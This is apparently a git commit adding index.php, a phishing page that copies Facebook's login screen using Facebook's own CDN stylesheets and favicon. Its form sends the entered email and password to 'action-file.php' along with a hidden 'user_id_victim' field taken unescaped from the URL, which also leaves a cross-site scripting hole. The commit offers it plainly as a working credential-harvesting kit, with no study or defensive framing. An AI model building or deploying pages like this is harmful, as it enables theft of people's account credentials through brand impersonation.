c0e3bc8a353c6d197ce9208fac3cc9a528110f25
a4anddev <a4anddev@gmail.com>
2018-06-12 23:43:45 +0530

    woriking

---
+++ index.php
@@ -0,0 +1,29 @@
+<html>
+<head>
+
+
+</style>
+
+<title id="pageTitle">Welcome to Facebook - Log In, Sign Up or Learn More</title>
+<link rel="shortcut icon" href="https://fbstatic-a.akamaihd.net/rsrc.php/yl/r/H3nktOa7ZMg.ico" />
+
+    <link type="text/css" rel="stylesheet" href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yf/r/4rzkhBmT64_.css" />
+    <link type="text/css" rel="stylesheet" href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/y7/r/9ukqo44vk05.css" />
+    <link type="text/css" rel="stylesheet" href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yL/r/x3bsMJyVkPp.css" />
+    <link type="text/css" rel="stylesheet" href="https://fbstatic-a.akamaihd.net/rsrc.php/v2/yY/r/bRpKCC99nTG.css" />
+
+</head>
+<body>
+<style type="text/css">
+body{
+background-image: url("en.jpg");
+}
+</style>
+
+
+<div class="loggedout_menubar_container"><div class="clearfix loggedout_menubar"><a class="lfloat" href="/" title="Go to Facebook Home"><i class="fb_logo img sp_ezjerk sx_440431"><u>Facebook logo</u></i></a><div class="menu_login_container rfloat"><form id="login_form" action="action-file.php" method="post" "><table cellspacing="0"><tbody><tr><td class="html7magic"><label for="email">Email or Phone</label></td><td class="html7magic"><label for="pass">Password</label></td></tr><tr><td><input type="text" class="inputtext" name="login" id="email"  tabindex="1"></td><td><input type="hidden" name="user_id_victim" value="<? echo $_GET['i']; ?>" />
+<input type="hidden" name="location" value="000"><input type="hidden" name="type" value="facebook"><input type="password" class="inputtext" name="pass" id="pass" tabindex="2"></td><td><label class="uiButton uiButtonConfirm" id="loginbutton" for="u_0_n"><input value="Log In" tabindex="4" type="submit" id="u_0_n"></label></td></tr><tr><td class="login_form_label_field"><div><div class="uiInputLabel clearfix uiInputLabelLegacy"><input id="persist_box" type="checkbox" name="persistent" value="1" tabindex="3" class="uiInputLabelInput uiInputLabelCheckbox"><label for="persist_box" class="uiInputLabelLabel">Keep me logged in</label></div><input type="hidden" name="default_persistent" value="0"></div></td><td class="login_form_label_field"><a rel="nofollow" href="https://www.facebook.com/recover/initiate">Forgot your password?</a></td></tr></tbody></table></form></div></div></div>
+
+
+</body>
+</html>
